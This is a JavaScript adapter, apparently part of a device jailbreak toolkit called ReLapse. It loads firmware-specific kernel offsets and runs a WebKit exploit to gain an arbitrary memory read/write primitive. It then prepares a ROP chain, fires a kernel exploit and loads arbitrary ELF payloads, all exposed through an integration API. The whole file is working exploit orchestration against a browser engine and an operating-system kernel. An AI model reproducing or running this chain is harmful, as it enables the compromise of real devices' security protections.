(function (global) {
  "use strict";

  var currentScript = document.currentScript;
  var adapterUrl = currentScript && currentScript.src
    ? currentScript.src
    : new URL("relapse/host-psm-adapter.js", document.baseURI).href;
  var baseUrl = adapterUrl.slice(0, adapterUrl.lastIndexOf("/") + 1);
  var runtimePromise = null;
  var runtimeFirmware = null;

  function path(relative) {
    return new URL(relative, baseUrl).href;
  }

  function relapseFirmware(firmware) {
    var match = /^0?([0-9]{1,2})\.([0-9]{2})$/.exec(String(firmware || ""));
    if (!match) throw new Error("Invalid firmware for ReLapse.");
    return String(parseInt(match[1], 10)) + "." + match[2];
  }

  function defaultMark(name, detail, type) {
    try {
      if (global.console && typeof global.console.log === "function") {
        global.console.log("[HostPSM/ReLapse]", type || "log", name,
          detail == null ? "" : detail);
      }
    } catch (_) {}
  }

  function log(message, type) {
    try {
      if (global.jb && typeof global.jb.mark === "function") {
        global.jb.mark(type === "error" ? "Failed" : "ReLapse", message, type);
      }
    } catch (_) {}
  }

  function loadClassicScript(relative) {
    return new Promise(function (resolve, reject) {
      var script = document.createElement("script");
      script.async = false;
      script.onload = function () { resolve(); };
      script.onerror = function () { reject(new Error("Could not load " + relative)); };
      script.src = path(relative);
      document.head.appendChild(script);
    });
  }

  function sleep(ms) {
    return new Promise(function (resolve) { setTimeout(resolve, ms); });
  }

  async function ensureRuntime(firmware) {
    var normalized = relapseFirmware(firmware);
    if (runtimePromise && runtimeFirmware === normalized) return runtimePromise;

    runtimeFirmware = normalized;
    runtimePromise = (async function () {
      global.HostPSMRelapseAdapter = true;
      global.HostPSMRelapseBaseUrl = baseUrl;
      global.fw_str = normalized;
      global.writeLog = function (message, type) { log(String(message), type || "log"); };
      global.jb = global.jb || {};
      global.jb.mark = global.jb.mark || defaultMark;

      await import(path("src/utils/int64.js"));
      await loadClassicScript("src/firmware.js");
      if (relapseFirmware(global.fw_str) !== normalized) {
        throw new Error("Detected firmware does not match the host-selected firmware.");
      }
      if (global.firmware && typeof global.firmware.rejection === "function") {
        var rejection = global.firmware.rejection();
        if (rejection) throw new Error(rejection);
      }

      await loadClassicScript("offsets/" + normalized + ".js");
      if (!global.KRW || !global.SYMBOLS) {
        throw new Error("ReLapse offsets did not expose kernel metadata.");
      }

      await loadClassicScript("src/rop.js");
      await loadClassicScript("src/utils/syscalls.js");
      await loadClassicScript("src/main.js");
      if (typeof global.prepareRop !== "function") {
        throw new Error("ReLapse ROP preparation is unavailable.");
      }
    })();

    return runtimePromise;
  }

  async function prepareUserland(options) {
    await ensureRuntime(options && options.firmware);
    var core = await import(path("src/core.js?v=132"));
    var mem = await import(path("src/utils/mem.js?v=131"));
    if (mem.memCoreInstance !== core.CORE_INSTANCE) {
      throw new Error("ReLapse core/mem instance mismatch.");
    }
    if (global.p && typeof global.p.read8 === "function") {
      log("Reusing existing ARW primitive", "info");
      return { primitive: global.p };
    }

    log("Starting WebKit exploit", "info");
    try { history.replaceState(null, ""); } catch (_) {}
    if (typeof global.gc === "function") { try { global.gc(); } catch (_) {} }
    await sleep(750);

    var carrier = await core.establishPrimitive({
      maxAttempts: 24,
      onEvent: function (name, detail, attempt) {
        var prefix = typeof attempt === "number" ? "[" + attempt + "] " : "";
        log(prefix + (detail == null || detail === "" ? name : name + ": " + detail), "log");
      },
      beforeCriticalLoad: function () {
        try { document.documentElement.offsetWidth; } catch (_) {}
      }
    });

    var primitive = mem.installWindowP(carrier, {
      onEvent: function (name, detail) {
        log(detail == null || detail === "" ? name : name + ": " + detail, "log");
      }
    });
    if (!mem.pairStatus || !mem.pairStatus.promoted) {
      throw new Error("ReLapse primitive pair was not promoted: " +
        (mem.pairStatus && mem.pairStatus.error ? mem.pairStatus.error : "unknown"));
    }

    if (typeof global.gc === "function") { try { global.gc(); } catch (_) {} }
    await sleep(1000);

    log("ARW ready; fake cell released", "success");
    return { primitive: primitive };
  }

  async function runKernel(userland) {
    if (!userland || !userland.primitive) {
      throw new Error("ReLapse userland context is invalid.");
    }
    var prepared = await global.prepareRop(userland.primitive);
    var relapse = await import(path("src/relapse_exploit.js"));
    var result = await relapse.runKernelExploit(prepared.p, prepared.chain, function (message, type) {
      log(message, type || "info");
    });
    if (!result || !result.done || !result.payloads) {
      throw new Error("ReLapse finished without an active ELF loader.");
    }
    return { p: prepared.p, chain: prepared.chain, result: result };
  }

  async function loadElf(kernel, bytes, metadata) {
    if (!kernel || !kernel.p || !kernel.chain) {
      throw new Error("ReLapse kernel context is invalid.");
    }
    var kexp = await import(path("src/kexp.js"));
    var name = metadata && metadata.url ? metadata.url.split("/").pop() : "host-psm-payload.elf";
    await kexp.loadElfPayloadBytes(name, bytes, kernel.p, kernel.chain, function (message) {
      log(message, "info");
    });
  }

  global.HostPSMIntegration = Object.freeze({
    apiVersion: 1,
    prepareUserland: prepareUserland,
    runKernel: runKernel,
    loadElf: loadElf
  });
})(window);
